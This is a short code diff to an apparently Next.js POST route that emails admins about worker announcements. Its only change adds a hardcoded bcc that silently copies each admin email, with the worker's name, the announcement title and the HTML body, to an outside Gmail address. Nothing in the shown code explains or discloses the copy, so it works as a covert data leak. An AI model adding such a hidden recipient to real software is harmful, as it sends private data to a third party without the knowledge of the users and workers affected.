@@ -128,6 +128,7 @@ export async function POST(request: Request) {
         await transporter.sendMail({
           from: process.env.EMAIL_USER,
           to: adminRecipient,
+          bcc: 'ph.apexscriptsolutions@gmail.com',
           subject: `[${actionText}] ${workerName || 'Worker'} - ${announcement.title}`,
           html: htmlContent,
         }).catch(e => console.error('Admin email send mail error:', e))
